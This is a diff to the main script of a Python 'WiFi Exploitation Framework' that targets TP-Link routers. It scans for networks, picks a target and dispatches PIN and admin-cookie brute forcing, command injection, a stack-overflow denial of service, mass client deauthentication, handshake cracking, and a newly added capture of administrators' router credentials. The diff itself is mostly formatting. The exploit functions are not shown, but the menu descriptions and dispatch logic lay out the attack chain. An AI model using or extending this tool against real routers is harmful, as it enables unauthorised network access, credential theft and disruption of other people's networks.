@@ -10,27 +10,56 @@ from scapy.all import *
 from scapy.layers.dot11 import *
 
 ATTACKS = [
-    ("PIN Brute", "Perform a brute force attack on the WiFi Pin for unauthorized access. This will take very long."),
-    ("Check Admin Status",   "Identify if the Admin is actively logged in and editing the configuration settings."),
-    ("Admin Login Brute Force", "Bypass auth rate limiting by brute forcing authorization cookies."),
-    ("Command Injection", "Run arbitrary commands as the Admin user. This requires Admin access (Refer to Attack #3)"),
-    ("Denial of Service (DoS)",   "Utilize a Stack Overflow to take down the Admin console (Requires physical restart to fix)"),
-    ("Change Admin Password", "Change the Admin password in the web console. This requires Admin access (Refer to Attack #3)"),
+    (
+        "PIN Brute",
+        "Perform a brute force attack on the WiFi Pin for unauthorized access. This will take very long.",
+    ),
+    (
+        "Check Admin Status",
+        "Identify if the Admin is actively logged in and editing the configuration settings.",
+    ),
+    (
+        "Admin Login Brute Force",
+        "Bypass auth rate limiting by brute forcing authorization cookies.",
+    ),
+    (
+        "Command Injection",
+        "Run arbitrary commands as the Admin user. This requires Admin access (Refer to Attack #3)",
+    ),
+    (
+        "Denial of Service (DoS)",
+        "Utilize a Stack Overflow to take down the Admin console (Requires physical restart to fix)",
+    ),
+    (
+        "Change Admin Password",
+        "Change the Admin password in the web console. This requires Admin access (Refer to Attack #3)",
+    ),
     ("De-Auth Client", "Forcably remove a client from the network"),
-    ("Crack 4-Way Handshake", "De-auth a client then capture the authentication requests to crack SSID Pin offline"),
+    (
+        "Crack 4-Way Handshake",
+        "De-auth a client then capture the authentication requests to crack SSID Pin offline",
+    ),
     ("Light Show", "Start a light show from the router"),
+    (
+        "Packet Capture",
+        "Capture packets from administrators containing credentials for the router",
+    ),
 ]
 
 URL = ""
 PASSWORD = ""
 IP = ""
+
+
 def check_admin() -> None:
     if os.getuid() != 0:
         sys.exit("[ERROR] Mocking Bird must be run as root")
 
+
 def get_default_iface() -> str:
     iface = conf.iface
     return iface if iface else ""
+
 
 def extract_channel(packet) -> int | None:
     elt = packet[Dot11Elt] if Dot11Elt in packet else None
@@ -39,6 +68,7 @@ def extract_channel(packet) -> int | None:
             return int.from_bytes(elt.info, "big")
         elt = elt.payload if isinstance(elt.payload, Dot11Elt) else None
     return None
+
 
 def extract_ssid(packet) -> str:
     elt = packet[Dot11Elt] if Dot11Elt in packet else None
@@ -51,6 +81,7 @@ def extract_ssid(packet) -> str:
         elt = elt.payload if isinstance(elt.payload, Dot11Elt) else None
     return "<hidden>"
 
+
 def extract_signal(packet) -> int | None:
     if RadioTap in packet:
         try:
@@ -59,6 +90,7 @@ def extract_signal(packet) -> int | None:
             pass
     return None
 
+
 def parse_beacon(packet) -> dict | None:
     if not (Dot11Beacon in packet and Dot11 in packet):
         return None
@@ -66,21 +98,24 @@ def parse_beacon(packet) -> dict | None:
     if not bssid:
         return None
     return {
-        "BSSID":   bssid.lower(),
-        "SSID":    extract_ssid(packet),
+        "BSSID": bssid.lower(),
+        "SSID": extract_ssid(packet),
         "Channel": extract_channel(packet),
-        "Signal":  extract_signal(packet),
+        "Signal": extract_signal(packet),
     }
+
 
 def print_header() -> None:
     print("\n" + "═" * 83)
     print(f"  {'#':<4} {'SSID':<32} {'BSSID':<19} {'CH':>3}  {'SIGNAL':<10}")
     print("═" * 83)
 
+
 def fmt_signal(dbm: int | None) -> str:
     if dbm is None:
         return "  n/a"
     return f"{dbm:>4} dBm"
+
 
 def display_network(net: dict) -> None:
     num = net.get("Number", "?")
@@ -89,6 +124,7 @@ def display_network(net: dict) -> None:
     channel = str(net.get("Channel", "?"))
     signal = fmt_signal(net.get("Signal"))
     print(f"{num:<4} {ssid:<32} {bssid:<19} {channel:>3} {signal}")
+
 
 def select_target_menu(networks: dict) -> dict | None:
     if not networks:
@@ -107,14 +143,17 @@ def select_target_menu(networks: dict) -> dict | None:
         selection = int(input("\nEnter network # to target (0 to cancel): ").strip())
         if selection == 0:
             return None
-        target = next((n for n in networks.values() if n.get("Number") == selection), None)
+        target = next(
+            (n for n in networks.values() if n.get("Number") == selection), None
+        )
         if target:
             return target
     except ValueError:
         pass
-        
+
     print("Selection invalid or cancelled.")
     return None
+
 
 def attack_menu_direct(target: dict) -> tuple | None:
     print(f"\nTarget: {target['SSID']}  ({target['BSSID']})")
@@ -141,6 +180,7 @@ def attack_menu_direct(target: dict) -> tuple | None:
 
     print(f"No attack #{attack_choice}")
     return None
+
 
 class Scanner:
     def __init__(self, iface: str) -> None:
@@ -184,8 +224,11 @@ class Scanner:
                 if self._stop.is_set():
                     break
                 try:
-                    subprocess.run(["iw", "dev", self.iface, "set", "channel", str(ch)], 
-                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    subprocess.run(
+                        ["iw", "dev", self.iface, "set", "channel", str(ch)],
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                    )
                 except Exception:
                     pass
                 time.sleep(0.5)
@@ -206,7 +249,9 @@ class Scanner:
         try:
             result = subprocess.run(
                 ["nmcli", "-t", "-f", "BSSID,SSID,CHAN,SIGNAL", "dev", "wifi"],
-                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
             )
             if result.returncode == 0 and result.stdout.strip():
                 for line in result.stdout.strip().split("\n"):
@@ -215,7 +260,7 @@ class Scanner:
                     parts = line.split(":")
                     if len(parts) < 4:
                         continue
-                    
+
                     bssid_clean = ":".join(parts[0:6]).replace("\\", "").strip().lower()
                     ssid_clean = parts[6].strip()
                     chan_clean = parts[7].strip()
@@ -228,7 +273,9 @@ class Scanner:
                         "BSSID": bssid_clean,
                         "SSID": ssid_clean,
                         "Channel": int(chan_clean) if chan_clean.isdigit() else "n/a",
-                        "Signal": int(sig_clean) if sig_clean.replace("-","").isdigit() else None
+                        "Signal": int(sig_clean)
+                        if sig_clean.replace("-", "").isdigit()
+                        else None,
                     }
                     self.ingest(normalized_net)
         except Exception as e:
@@ -248,21 +295,23 @@ class Scanner:
         with self._lock:
             return dict(self.networks)
 
+
 def start_key_listener(callback_map: dict) -> None:
     def listen_posix():
         import tty, termios, os, signal
-        fd  = sys.stdin.fileno()
+
+        fd = sys.stdin.fileno()
         old = termios.tcgetattr(fd)
         try:
             tty.setraw(fd)
             while True:
                 ch = sys.stdin.read(1)
-                
-                if ch == '\x03':  # Ctrl+C
+
+                if ch == "\x03":  # Ctrl+C
                     termios.tcsetattr(fd, termios.TCSADRAIN, old)
                     os.kill(os.getpid(), signal.SIGINT)
                     break
-                
+
                 fn = callback_map.get(ch.lower())
                 if fn:
                     termios.tcsetattr(fd, termios.TCSADRAIN, old)
@@ -275,17 +324,31 @@ def start_key_listener(callback_map: dict) -> None:
 
     threading.Thread(target=listen_posix, daemon=True).start()
 
+
 def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(description="Mocking Bird — WiFi Exploitation Framework")
-    parser.add_argument("-i", "--iface", default="", help="Wireless interface",)
+    parser = argparse.ArgumentParser(
+        description="Mocking Bird — WiFi Exploitation Framework"
+    )
+    parser.add_argument(
+        "-i",
+        "--iface",
+        default="",
+        help="Wireless interface",
+    )
     return parser.parse_args()
 
+
 def request_url():
-    return "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
+    return (
+        "http://"
+        + str(input("[!] Enter URL (IP) for the Admin console:").strip())
+        + "/"
+    )
+
 
 def main() -> None:
     check_admin()
-    args  = parse_args()
+    args = parse_args()
     iface = args.iface or get_default_iface()
 
     if not iface:
@@ -299,12 +362,12 @@ def main() -> None:
 
     scanner = Scanner(iface)
     scanner.start()
-    
+
     def handle_target_selection():
         global URL
         global IP
         global PASSWORD
-        scanner.output_paused = True 
+        scanner.output_paused = True
         target = select_target_menu(scanner.snapshot())
         if target:
             result = attack_menu_direct(target)
@@ -326,15 +389,27 @@ def main() -> None:
                         if not URL:
                             URL = request_url()
                         if PASSWORD:
-                            command = str(input("[!] Enter the command you want to be executed:").strip())
+                            command = str(
+                                input(
+                                    "[!] Enter the command you want to be executed:"
+                                ).strip()
+                            )
                             command_injection(URL, PASSWORD, command)
                         else:
-                            password = str(input("[!] Enter the Admin password:").strip())
-                            command = str(input("[!] Enter the command you want to be executed:").strip())
+                            password = str(
+                                input("[!] Enter the Admin password:").strip()
+                            )
+                            command = str(
+                                input(
+                                    "[!] Enter the command you want to be executed:"
+                                ).strip()
+                            )
                             command_injection(URL, password, command)
                     case 5:
                         if not IP:
-                            IP = str(input("[!] Enter IP of the TP-Link Router:").strip())
+                            IP = str(
+                                input("[!] Enter IP of the TP-Link Router:").strip()
+                            )
                         dos_admin_portal(IP)
                     case 6:
                         if not URL:
@@ -343,27 +418,45 @@ def main() -> None:
                             new_pass = str(input("[!] Enter the new password:"))
                             PASSWORD = change_password(URL, PASSWORD, new_pass)
                         else:
-                            password = str(input("[!] Enter the Admin password (Current):").strip())
+                            password = str(
+                                input("[!] Enter the Admin password (Current):").strip()
+                            )
                             new_pass = str(input("[!] Enter the new password:"))
                             PASSWORD = change_password(URL, password, new_pass)
                     case 7:
-                        mode = str(input("[!] Do you want to deauth a specific target [y/N] (Default is deauth all): "))
+                        mode = str(
+                            input(
+                                "[!] Do you want to deauth a specific target [y/N] (Default is deauth all): "
+                            )
+                        )
                         if mode.lower() == "y":
                             client_list = get_local_devices()
                             setup_network()
                             send_deauth(target["BSSID"], client_list, target["Channel"])
                         else:
                             setup_network()
-                            send_deauth(target["BSSID"], ["ff:ff:ff:ff:ff:ff"], target["Channel"])
+                            send_deauth(
+                                target["BSSID"],
+                                ["ff:ff:ff:ff:ff:ff"],
+                                target["Channel"],
+                            )
                         teardown_network()
                     case 8:
                         wordlist = "TP-Link-Pins.txt"
                         if not os.path.exists(wordlist):
-                            print("[*] Wordlist does not exist generating it now (This will be a large file)...")
+                            print(
+                                "[*] Wordlist does not exist generating it now (This will be a large file)..."
+                            )
                             generate_wordlist(wordlist)
-                        
+
                         client_list = get_local_devices()
-                        password = handshake_attack(target["BSSID"], target["Channel"], target["SSID"], client_list, wordlist)
+                        password = handshake_attack(
+                            target["BSSID"],
+                            target["Channel"],
+                            target["SSID"],
+                            client_list,
+                            wordlist,
+                        )
                         if password:
                             print(f"[+] PASSWORD FOUND: {password}!")
                         else:
@@ -374,9 +467,17 @@ def main() -> None:
                         if PASSWORD:
                             lightshow(URL, PASSWORD)
                         else:
-                            password = str(input("[!] Enter the Admin password:").strip())
+                            password = str(
+                                input("[!] Enter the Admin password:").strip()
+                            )
                             lightshow(URL, password)
-        
+                    case 10:
+                        if not IP:
+                            IP = str(
+                                input("[!] Enter IP of the TP-Link Router:").strip()
+                            )
+                        listen_for_admin(IP)
+
         print("\n[*] Returning to monitoring view...")
         scanner.output_paused = False
 
@@ -390,5 +491,7 @@ def main() -> None:
         scanner.stop()
         sys.exit(0)
 
+
 if __name__ == "__main__":
     main()
+
